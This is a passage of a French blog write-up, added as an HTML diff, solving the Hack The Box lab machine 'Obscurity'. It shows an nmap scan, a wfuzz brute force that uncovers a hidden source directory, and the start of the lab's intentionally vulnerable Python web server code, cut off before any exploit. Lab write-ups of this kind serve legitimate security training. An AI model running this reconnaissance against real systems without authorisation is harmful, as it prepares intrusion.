@@ -1,0 +1,750 @@
+<!DOCTYPE html>
+<html lang="fr">
+    
+    
+
+
+    <head>
+    <link href="https://gmpg.org/xfn/11" rel="profile">
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta http-equiv="Cache-Control" content="public" />
+<!-- Enable responsiveness on mobile devices -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="generator" content="Hugo 0.78.2" />
+
+    
+    
+    
+
+<title>Obscurity - Medium • LOLOLEKIK</title>
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Obscurity - Medium"/>
+<meta name="twitter:description" content="Résolution de la box Obscurity
+Introduction La box Obscurity de Hack The Box est une box Linux de difficulté &ldquo;Medium&rdquo;.
+Foothold Enumération On commence par faire un nmap en enregistrant le résultat dans un xml pour pouvoir l&rsquo;utiliser avec searchsploit.
+┌──(lololekik㉿Ashitaka)-[~/Documents/htb/obscurity] └─$ sudo nmap -p- -A obscurity.htb -oX obscurity.htb Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-27 13:21 CET Nmap scan report for obscurity.htb (10.10.10.168) Host is up (0.034s latency). Not shown: 65531 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7."/>
+
+<meta property="og:title" content="Obscurity - Medium" />
+<meta property="og:description" content="Résolution de la box Obscurity
+Introduction La box Obscurity de Hack The Box est une box Linux de difficulté &ldquo;Medium&rdquo;.
+Foothold Enumération On commence par faire un nmap en enregistrant le résultat dans un xml pour pouvoir l&rsquo;utiliser avec searchsploit.
+┌──(lololekik㉿Ashitaka)-[~/Documents/htb/obscurity] └─$ sudo nmap -p- -A obscurity.htb -oX obscurity.htb Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-27 13:21 CET Nmap scan report for obscurity.htb (10.10.10.168) Host is up (0.034s latency). Not shown: 65531 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://lololekik.com/hack-the-box/obscurity/" />
+<meta property="og:site_name" content="OffSec &amp; CO" />
+
+
+    
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/qtcreator_dark.min.css">
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/scss/hyde-hyde.816e5b26c5966343ef21f902ba05a763964deb2ae3fdcd9a954614131b756c59.css" integrity="sha256-gW5bJsWWY0PvIfkCugWnY5ZN6yrj/c2alUYUExt1bFk=">
+
+
+<link rel="stylesheet" href="/scss/print.2744dcbf8a0b2e74f8a50e4b34e5f441be7cf93cc7de27029121c6a09f9e77bc.css" integrity="sha256-J0Tcv4oLLnT4pQ5LNOX0Qb58&#43;TzH3icCkSHGoJ&#43;ed7w=" media="print">
+
+
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+    <!-- Icons -->
+    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
+    <link rel="shortcut icon" href="/favicon.png">
+    
+    <link rel="stylesheet" href="/css/custom.css">
+
+
+
+
+
+</head>
+
+
+    <body class=" ">
+    
+<div class="sidebar">
+  <div class="container ">
+    <div class="sidebar-about">
+      <span class="site__title">
+        <a href="http://lololekik.com/">LOLOLEKIK</a>
+      </span>
+      
+        
+        
+        
+        <div class="author-image">
+          <img src="http://lololekik.com/img/author.jpg" alt="Author Image" class="img--circle img--headshot element--center">
+        </div>
+        
+      
+      
+      <p class="site__description">
+         OffSec &amp; Co 
+      </p>
+    </div>
+    <div class="collapsible-menu">
+      <input type="checkbox" id="menuToggle">
+      <label for="menuToggle">LOLOLEKIK</label>
+      <div class="menu-content">
+        <div>
+	<ul class="sidebar-nav">
+		 
+		 
+			 
+				<li>
+					<a href="/cuisine/">
+						<span>Cuisine</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/exploit/">
+						<span>Exploit</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/network/">
+						<span>Network</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/writeups/">
+						<span>WriteUps</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/hack-the-box/">
+						<span>HackTheBox</span>
+					</a>
+				</li>
+			 
+		
+	</ul>
+</div>
+
+        <section class="social">
+	
+	
+	
+	<a href="https://github.com/LOLOLEKIK" rel="me"><i class="fab fa-github fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+	
+	
+	
+	
+	<a href="https://root-me.org/lololekik" target="blank" class="linklogo"><div class="rootme_logo logohover"> </div></a>
+	
+	
+	<a href="https://hackthebox.eu/home/users/profile/202145" target="blank" class="linklogo"><div class="hackthebox_logo logohover"> </div></a>
+	
+	
+	<a href="https://linkedin.com/in/loris-thiebaut-8b4b85197" rel="me"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	<a href="mailto:loris.thiebaut@gmail.com" rel="me"><i class="fas fa-at fa-lg" aria-hidden="true"></i></a>
+	
+</section>
+
+      </div>
+    </div>
+    
+
+<div class="builtwith">
+Built with <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
+</div>
+
+
+  </div>
+</div>
+
+        <div class="content container">
+            
+    
+<article>
+  <header>
+    <h1>Obscurity - Medium</h1>
+    
+    
+<div class="post__meta">
+    
+    
+    
+    
+      
+      
+          in
+          
+          
+              <a class="badge badge-category" href="/categories/hack-the-box">HACK THE BOX</a>
+              
+          
+      
+    
+    
+    
+      
+      
+          <br/>
+           <i class="fas fa-tags"></i>
+          
+          <a class="badge badge-tag" href="/tags/pentest">pentest</a>
+           
+      
+          <a class="badge badge-tag" href="/tags/linux">linux</a>
+           
+      
+          <a class="badge badge-tag" href="/tags/medium">medium</a>
+           
+      
+          <a class="badge badge-tag" href="/tags/wfuzz">wfuzz</a>
+          
+      
+    
+    
+    <br/>
+    <i class="fas fa-clock"></i> 8 min read
+</div>
+
+
+  </header>
+  
+  
+  <div class="post">
+    <p><strong>Résolution de la box Obscurity</strong></p>
+<h1 id="introduction">Introduction</h1>
+<p>La box <strong>Obscurity</strong> de Hack The Box est une box Linux de difficulté &ldquo;Medium&rdquo;.</p>
+
+
+
+  <img src="/img/htb/obscurity/resume.png" alt="Résumé de la machine Obscurity" class="imageformat"/>
+
+<h1 id="foothold">Foothold</h1>
+<h2 id="enumération">Enumération</h2>
+<p>On commence par faire un nmap en enregistrant le résultat dans un xml pour pouvoir l&rsquo;utiliser avec searchsploit.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-zsh" data-lang="zsh">┌──<span style="color:#f92672">(</span>lololekik㉿Ashitaka<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/htb/obscurity<span style="color:#f92672">]</span>
+└─$ sudo nmap -p- -A obscurity.htb -oX obscurity.htb
+
+Starting Nmap 7.91 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-01-27 13:21 CET
+Nmap scan report <span style="color:#66d9ef">for</span> obscurity.htb <span style="color:#f92672">(</span>10.10.10.168<span style="color:#f92672">)</span>
+Host is up <span style="color:#f92672">(</span>0.034s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">65531</span> filtered ports
+PORT     STATE  SERVICE    VERSION
+22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey: 
+|   <span style="color:#ae81ff">2048</span> 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+|   <span style="color:#ae81ff">256</span> f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+|_  <span style="color:#ae81ff">256</span> e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+80/tcp   closed http
+8080/tcp open   http-proxy BadHTTPServer
+| fingerprint-strings: 
+|   GetRequest: 
+|     HTTP/1.1 <span style="color:#ae81ff">200</span> OK
+|     Date: Wed, <span style="color:#ae81ff">27</span> Jan <span style="color:#ae81ff">2021</span> 12:23:27
+|     Server: BadHTTPServer
+|     Last-Modified: Wed, <span style="color:#ae81ff">27</span> Jan <span style="color:#ae81ff">2021</span> 12:23:27
+|     Content-Length: <span style="color:#ae81ff">4171</span>
+|     Content-Type: text/html
+|     Connection: Closed
+|     &lt;!DOCTYPE html&gt;
+|     &lt;html lang<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;
+|     &lt;head&gt;
+|     &lt;meta charset<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>&gt;
+|     &lt;title&gt;0bscura&lt;/title&gt;
+|     &lt;meta http-equiv<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;X-UA-Compatible&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;IE=Edge&#34;</span>&gt;
+|     &lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;viewport&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width, initial-scale=1&#34;</span>&gt;
+|     &lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;keywords&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>&gt;
+|     &lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;description&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>&gt;
+|     &lt;!-- 
+|     Easy Profile Template
+|     http://www.templatemo.com/tm-467-easy-profile
+|     &lt;!-- stylesheet css --&gt;
+|     &lt;link rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;css/bootstrap.min.css&#34;</span>&gt;
+|     &lt;link rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;css/font-awesome.min.css&#34;</span>&gt;
+|     &lt;link rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;css/templatemo-blue.css&#34;</span>&gt;
+|     &lt;/head&gt;
+|     &lt;body data-spy<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;scroll&#34;</span> data-target<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;.navbar-collapse&#34;</span>&gt;
+|     &lt;!-- preloader section --&gt;
+|     &lt;!--
+|     &lt;div class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;preloader&#34;</span>&gt;
+|     &lt;div class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;sk-spinner sk-spinner-wordpress&#34;</span>&gt;
+|   HTTPOptions: 
+|     HTTP/1.1 <span style="color:#ae81ff">200</span> OK
+|     Date: Wed, <span style="color:#ae81ff">27</span> Jan <span style="color:#ae81ff">2021</span> 12:23:28
+|     Server: BadHTTPServer
+|     Last-Modified: Wed, <span style="color:#ae81ff">27</span> Jan <span style="color:#ae81ff">2021</span> 12:23:28
+|     Content-Length: <span style="color:#ae81ff">4171</span>
+|     Content-Type: text/html
+|     Connection: Closed
+|     &lt;!DOCTYPE html&gt;
+|     &lt;html lang<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;
+|     &lt;head&gt;
+|     &lt;meta charset<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>&gt;
+|     &lt;title&gt;0bscura&lt;/title&gt;
+|     &lt;meta http-equiv<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;X-UA-Compatible&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;IE=Edge&#34;</span>&gt;
+|     &lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;viewport&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width, initial-scale=1&#34;</span>&gt;
+|     &lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;keywords&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>&gt;
+|     &lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;description&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>&gt;
+|     &lt;!-- 
+|     Easy Profile Template
+|     http://www.templatemo.com/tm-467-easy-profile
+|     &lt;!-- stylesheet css --&gt;
+|     &lt;link rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;css/bootstrap.min.css&#34;</span>&gt;
+|     &lt;link rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;css/font-awesome.min.css&#34;</span>&gt;
+|     &lt;link rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;css/templatemo-blue.css&#34;</span>&gt;
+|     &lt;/head&gt;
+|     &lt;body data-spy<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;scroll&#34;</span> data-target<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;.navbar-collapse&#34;</span>&gt;
+|     &lt;!-- preloader section --&gt;
+|     &lt;!--
+|     &lt;div class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;preloader&#34;</span>&gt;
+|_    &lt;div class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;sk-spinner sk-spinner-wordpress&#34;</span>&gt;
+|_http-server-header: BadHTTPServer
+|_http-title: 0bscura
+9000/tcp closed cslistener
+<span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8080-TCP:V<span style="color:#f92672">=</span>7.91%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>1/27%Time<span style="color:#f92672">=</span>60115B3F%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>Ge
+SF:tRequest,10FC,<span style="color:#e6db74">&#34;HTTP/1\.1\x20200\x20OK\nDate:\x20Wed,\x2027\x20Jan\x2020
+</span><span style="color:#e6db74">SF:21\x2012:23:27\nServer:\x20BadHTTPServer\nLast-Modified:\x20Wed,\x2027\
+</span><span style="color:#e6db74">SF:x20Jan\x202021\x2012:23:27\nContent-Length:\x204171\nContent-Type:\x20t
+</span><span style="color:#e6db74">SF:ext/html\nConnection:\x20Closed\n\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang=\&#34;
+</span><span style="color:#e6db74">SF:en\&#34;&gt;\n&lt;head&gt;\n\t&lt;meta\x20charset=\&#34;utf-8\&#34;&gt;\n\t&lt;title&gt;0bscura&lt;/title&gt;\
+</span><span style="color:#e6db74">SF:n\t&lt;meta\x20http-equiv=\&#34;X-UA-Compatible\&#34;\x20content=\&#34;IE=Edge\&#34;&gt;\n\t&lt;
+</span><span style="color:#e6db74">SF:meta\x20name=\&#34;viewport\&#34;\x20content=\&#34;width=device-width,\x20initial-s
+</span><span style="color:#e6db74">SF:cale=1\&#34;&gt;\n\t&lt;meta\x20name=\&#34;keywords\&#34;\x20content=\&#34;\&#34;&gt;\n\t&lt;meta\x20na
+</span><span style="color:#e6db74">SF:me=\&#34;description\&#34;\x20content=\&#34;\&#34;&gt;\n&lt;!--\x20\nEasy\x20Profile\x20Templ
+</span><span style="color:#e6db74">SF:ate\nhttp://www\.templatemo\.com/tm-467-easy-profile\n--&gt;\n\t&lt;!--\x20st
+</span><span style="color:#e6db74">SF:ylesheet\x20css\x20--&gt;\n\t&lt;link\x20rel=\&#34;stylesheet\&#34;\x20href=\&#34;css/boo
+</span><span style="color:#e6db74">SF:tstrap\.min\.css\&#34;&gt;\n\t&lt;link\x20rel=\&#34;stylesheet\&#34;\x20href=\&#34;css/font-a
+</span><span style="color:#e6db74">SF:wesome\.min\.css\&#34;&gt;\n\t&lt;link\x20rel=\&#34;stylesheet\&#34;\x20href=\&#34;css/templa
+</span><span style="color:#e6db74">SF:temo-blue\.css\&#34;&gt;\n&lt;/head&gt;\n&lt;body\x20data-spy=\&#34;scroll\&#34;\x20data-target
+</span><span style="color:#e6db74">SF:=\&#34;\.navbar-collapse\&#34;&gt;\n\n&lt;!--\x20preloader\x20section\x20--&gt;\n&lt;!--\n&lt;
+</span><span style="color:#e6db74">SF:div\x20class=\&#34;preloader\&#34;&gt;\n\t&lt;div\x20class=\&#34;sk-spinner\x20sk-spinner
+</span><span style="color:#e6db74">SF:-wordpress\&#34;&gt;\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>HTTPOptions,10FC,<span style="color:#e6db74">&#34;HTTP/1\.1\x20200\x20OK\nDate:\x20
+</span><span style="color:#e6db74">SF:Wed,\x2027\x20Jan\x202021\x2012:23:28\nServer:\x20BadHTTPServer\nLast-M
+</span><span style="color:#e6db74">SF:odified:\x20Wed,\x2027\x20Jan\x202021\x2012:23:28\nContent-Length:\x204
+</span><span style="color:#e6db74">SF:171\nContent-Type:\x20text/html\nConnection:\x20Closed\n\n&lt;!DOCTYPE\x20
+</span><span style="color:#e6db74">SF:html&gt;\n&lt;html\x20lang=\&#34;en\&#34;&gt;\n&lt;head&gt;\n\t&lt;meta\x20charset=\&#34;utf-8\&#34;&gt;\n\t
+</span><span style="color:#e6db74">SF:&lt;title&gt;0bscura&lt;/title&gt;\n\t&lt;meta\x20http-equiv=\&#34;X-UA-Compatible\&#34;\x20co
+</span><span style="color:#e6db74">SF:ntent=\&#34;IE=Edge\&#34;&gt;\n\t&lt;meta\x20name=\&#34;viewport\&#34;\x20content=\&#34;width=dev
+</span><span style="color:#e6db74">SF:ice-width,\x20initial-scale=1\&#34;&gt;\n\t&lt;meta\x20name=\&#34;keywords\&#34;\x20conte
+</span><span style="color:#e6db74">SF:nt=\&#34;\&#34;&gt;\n\t&lt;meta\x20name=\&#34;description\&#34;\x20content=\&#34;\&#34;&gt;\n&lt;!--\x20\nE
+</span><span style="color:#e6db74">SF:asy\x20Profile\x20Template\nhttp://www\.templatemo\.com/tm-467-easy-pro
+</span><span style="color:#e6db74">SF:file\n--&gt;\n\t&lt;!--\x20stylesheet\x20css\x20--&gt;\n\t&lt;link\x20rel=\&#34;stylesh
+</span><span style="color:#e6db74">SF:eet\&#34;\x20href=\&#34;css/bootstrap\.min\.css\&#34;&gt;\n\t&lt;link\x20rel=\&#34;stylesheet
+</span><span style="color:#e6db74">SF:\&#34;\x20href=\&#34;css/font-awesome\.min\.css\&#34;&gt;\n\t&lt;link\x20rel=\&#34;stylesheet
+</span><span style="color:#e6db74">SF:\&#34;\x20href=\&#34;css/templatemo-blue\.css\&#34;&gt;\n&lt;/head&gt;\n&lt;body\x20data-spy=\&#34;
+</span><span style="color:#e6db74">SF:scroll\&#34;\x20data-target=\&#34;\.navbar-collapse\&#34;&gt;\n\n&lt;!--\x20preloader\x20
+</span><span style="color:#e6db74">SF:section\x20--&gt;\n&lt;!--\n&lt;div\x20class=\&#34;preloader\&#34;&gt;\n\t&lt;div\x20class=\&#34;s
+</span><span style="color:#e6db74">SF:k-spinner\x20sk-spinner-wordpress\&#34;&gt;\n&#34;</span><span style="color:#f92672">)</span>;
+Aggressive OS guesses: Linux 3.2 - 4.9 <span style="color:#f92672">(</span>94%<span style="color:#f92672">)</span>, Linux 3.1 <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>, Linux 3.2 <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>, Linux 3.18 <span style="color:#f92672">(</span>92%<span style="color:#f92672">)</span>, AXIS 210A or <span style="color:#ae81ff">211</span> Network Camera <span style="color:#f92672">(</span>Linux 2.6.17<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>92%<span style="color:#f92672">)</span>, Linux 3.16 <span style="color:#f92672">(</span>91%<span style="color:#f92672">)</span>, Oracle VM Server 3.4.2 <span style="color:#f92672">(</span>Linux 4.1<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>91%<span style="color:#f92672">)</span>, Linux 5.1 <span style="color:#f92672">(</span>91%<span style="color:#f92672">)</span>, Crestron XPanel control system <span style="color:#f92672">(</span>91%<span style="color:#f92672">)</span>, Android 4.1.1 <span style="color:#f92672">(</span>91%<span style="color:#f92672">)</span>
+No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
+Network Distance: <span style="color:#ae81ff">2</span> hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE <span style="color:#f92672">(</span>using port 80/tcp<span style="color:#f92672">)</span>
+HOP RTT      ADDRESS
+<span style="color:#ae81ff">1</span>   33.09 ms 10.10.14.1
+<span style="color:#ae81ff">2</span>   33.85 ms obscurity.htb <span style="color:#f92672">(</span>10.10.10.168<span style="color:#f92672">)</span>
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 127.96 seconds
+</code></pre></div><p>En regardant sur le site Web il est indiqué qu&rsquo;il y a un répertoire secret avec le code source du serveur. On peut essayer de le trouver avec Wfuzz.</p>
+<pre><code class="language-"shell" data-lang=""shell">┌──(lololekik㉿Ashitaka)-[~/Documents/htb/obscurity]
+└─$ wfuzz --hc 404 -c -v -R 5 -L -w /usr/share/wordlists/dirb/common.txt -u http://obscurity.htb:8080/FUZZ/SuperSecureServer.py                                                                                                      130 ⨯
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.0.1 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://obscurity.htb:8080/FUZZ/SuperSecureServer.py
+Total requests: 4614
+
+==================================================================================================================================================
+ID           C.Time       Response   Lines    Word     Chars       Server                           Redirect                         Payload                                                                                   
+==================================================================================================================================================
+
+000001245:   0.069s       200        170 L    498 W    5892 Ch     BadHTTPServer                                                     &quot;develop&quot;                                                                                 
+^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:50: UserWarning:Finishing pending requests...
+
+Total time: 0
+Processed Requests: 3187
+Filtered Requests: 3186
+Requests/sec.: 0
+
+                            
+</code></pre><p>On trouver le répertoire develop. On trouve le code suivant.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> socket
+<span style="color:#f92672">import</span> threading
+<span style="color:#f92672">from</span> datetime <span style="color:#f92672">import</span> datetime
+<span style="color:#f92672">import</span> sys
+<span style="color:#f92672">import</span> os
+<span style="color:#f92672">import</span> mimetypes
+<span style="color:#f92672">import</span> urllib.parse
+<span style="color:#f92672">import</span> subprocess
+
+respTemplate <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;HTTP/1.1 {statusNum} {statusCode}
+</span><span style="color:#e6db74">Date: {dateSent}
+</span><span style="color:#e6db74">Server: {server}
+</span><span style="color:#e6db74">Last-Modified: {modified}
+</span><span style="color:#e6db74">Content-Length: {length}
+</span><span style="color:#e6db74">Content-Type: {contentType}
+</span><span style="color:#e6db74">Connection: {connectionType}
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">{body}
+</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+DOC_ROOT <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;DocRoot&#34;</span>
+
+CODES <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;200&#34;</span>: <span style="color:#e6db74">&#34;OK&#34;</span>, 
+        <span style="color:#e6db74">&#34;304&#34;</span>: <span style="color:#e6db74">&#34;NOT MODIFIED&#34;</span>,
+        <span style="color:#e6db74">&#34;400&#34;</span>: <span style="color:#e6db74">&#34;BAD REQUEST&#34;</span>, <span style="color:#e6db74">&#34;401&#34;</span>: <span style="color:#e6db74">&#34;UNAUTHORIZED&#34;</span>, <span style="color:#e6db74">&#34;403&#34;</span>: <span style="color:#e6db74">&#34;FORBIDDEN&#34;</span>, <span style="color:#e6db74">&#34;404&#34;</span>: <span style="color:#e6db74">&#34;NOT FOUND&#34;</span>, 
+        <span style="color:#e6db74">&#34;500&#34;</span>: <span style="color:#e6db74">&#34;INTERNAL SERVER ERROR&#34;</span>}
+
+MIMES <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;txt&#34;</span>: <span style="color:#e6db74">&#34;text/plain&#34;</span>, <span style="color:#e6db74">&#34;css&#34;</span>:<span style="color:#e6db74">&#34;text/css&#34;</span>, <span style="color:#e6db74">&#34;html&#34;</span>:<span style="color:#e6db74">&#34;text/html&#34;</span>, <span style="color:#e6db74">&#34;png&#34;</span>: <span style="color:#e6db74">&#34;image/png&#34;</span>, <span style="color:#e6db74">&#34;jpg&#34;</span>:<span style="color:#e6db74">&#34;image/jpg&#34;</span>, 
+        <span style="color:#e6db74">&#34;ttf&#34;</span>:<span style="color:#e6db74">&#34;application/octet-stream&#34;</span>,<span style="color:#e6db74">&#34;otf&#34;</span>:<span style="color:#e6db74">&#34;application/octet-stream&#34;</span>, <span style="color:#e6db74">&#34;woff&#34;</span>:<span style="color:#e6db74">&#34;font/woff&#34;</span>, <span style="color:#e6db74">&#34;woff2&#34;</span>: <span style="color:#e6db74">&#34;font/woff2&#34;</span>, 
+        <span style="color:#e6db74">&#34;js&#34;</span>:<span style="color:#e6db74">&#34;application/javascript&#34;</span>,<span style="color:#e6db74">&#34;gz&#34;</span>:<span style="color:#e6db74">&#34;application/zip&#34;</span>, <span style="color:#e6db74">&#34;py&#34;</span>:<span style="color:#e6db74">&#34;text/plain&#34;</span>, <span style="color:#e6db74">&#34;map&#34;</span>: <span style="color:#e6db74">&#34;application/octet-stream&#34;</span>}
+
+
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Response</span>:
+    <span style="color:#66d9ef">def</span> __init__(self, <span style="color:#f92672">**</span>kwargs):
+        self<span style="color:#f92672">.</span>__dict__<span style="color:#f92672">.</span>update(kwargs)
+        now <span style="color:#f92672">=</span> datetime<span style="color:#f92672">.</span>now()
+        self<span style="color:#f92672">.</span>dateSent <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>modified <span style="color:#f92672">=</span> now<span style="color:#f92672">.</span>strftime(<span style="color:#e6db74">&#34;%a, </span><span style="color:#e6db74">%d</span><span style="color:#e6db74"> %b %Y %H:%M:%S&#34;</span>)
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">stringResponse</span>(self):
+        <span style="color:#66d9ef">return</span> respTemplate<span style="color:#f92672">.</span>format(<span style="color:#f92672">**</span>self<span style="color:#f92672">.</span>__dict__)
+
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Request</span>:
+    <span style="color:#66d9ef">def</span> __init__(self, request):
+        self<span style="color:#f92672">.</span>good <span style="color:#f92672">=</span> True
+        <span style="color:#66d9ef">try</span>:
+            request <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>parseRequest(request)
+            self<span style="color:#f92672">.</span>method <span style="color:#f92672">=</span> request[<span style="color:#e6db74">&#34;method&#34;</span>]
+            self<span style="color:#f92672">.</span>doc <span style="color:#f92672">=</span> request[<span style="color:#e6db74">&#34;doc&#34;</span>]
+            self<span style="color:#f92672">.</span>vers <span style="color:#f92672">=</span> request[<span style="color:#e6db74">&#34;vers&#34;</span>]
+            self<span style="color:#f92672">.</span>header <span style="color:#f92672">=</span> request[<span style="color:#e6db74">&#34;header&#34;</span>]
+            self<span style="color:#f92672">.</span>body <span style="color:#f92672">=</span> request[<span style="color:#e6db74">&#34;body&#34;</span>]
+        <span style="color:#66d9ef">except</span>:
+            self<span style="color:#f92672">.</span>good <span style="color:#f92672">=</span> False
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">parseRequest</span>(self, request):        
+        req <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>strip(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+        method,doc,vers <span style="color:#f92672">=</span> req[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34; &#34;</span>)
+        header <span style="color:#f92672">=</span> req[<span style="color:#ae81ff">1</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>]
